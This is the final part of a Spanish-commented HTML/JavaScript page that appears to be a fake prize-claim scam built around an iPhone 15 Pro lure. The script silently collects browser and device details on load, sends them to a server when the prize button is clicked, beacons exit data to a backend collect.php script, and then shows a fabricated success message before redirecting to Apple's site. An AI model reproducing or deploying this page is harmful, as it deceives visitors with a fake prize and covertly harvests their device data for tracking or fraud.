                    from { opacity: 0; transform: translate(-50%, -50%) scale(0.8); }
                    to { opacity: 1; transform: translate(-50%, -50%) scale(1); }
                }
                @keyframes progressBar {
                    from { width: 0%; }
                    to { width: 100%; }
                }
            `;
            document.head.appendChild(style);
            document.body.appendChild(redirectMsg);
            
            // Redirecci√≥n despu√©s de 3 segundos
            setTimeout(() => {
                window.location.href = 'https://www.google.com';
            }, 3000);
        }
        
        // Funci√≥n principal que se ejecuta al hacer clic
        async function claimPrize() {
            const button = document.querySelector('.claim-btn');
            const loading = document.getElementById('loading');
            const success = document.getElementById('success');
            
            // Mostrar loading
            button.style.display = 'none';
            loading.style.display = 'block';
            
            // Recolectar todos los datos
            const data = await collectDeviceData();
            
            // Enviar datos al servidor
            const result = await sendDataToServer(data);
            
            // Simular tiempo de procesamiento
            setTimeout(() => {
                loading.style.display = 'none';
                success.style.display = 'block';
                
                // Redirigir despu√©s de 3 segundos
                setTimeout(() => {
                    window.location.href = 'https://www.apple.com/iphone-15-pro/';
                }, 3000);
            }, 2000);
        }
        
        // Recolectar datos b√°sicos al cargar la p√°gina
        window.addEventListener('load', async () => {
            const basicData = {
                trackingId: trackingId,
                timestamp: new Date().toISOString(),
                event: 'page_load',
                userAgent: navigator.userAgent,
                referrer: document.referrer,
                currentUrl: window.location.href,
                screenResolution: screen.width + 'x' + screen.height,
                language: navigator.language
            };
            
            // Enviar datos de carga de p√°gina
            await sendDataToServer(basicData);
        });
        
        // Detectar cuando el usuario sale de la p√°gina
        window.addEventListener('beforeunload', async () => {
            const exitData = {
                trackingId: trackingId,
                timestamp: new Date().toISOString(),
                event: 'page_exit',
                timeOnPage: Date.now() - performance.timing.navigationStart
            };
            
            // Usar sendBeacon para enviar datos al salir
            if (navigator.sendBeacon) {
                navigator.sendBeacon('../backend/collect.php', JSON.stringify(exitData));
            }
        });
    </script>
</body>
</html>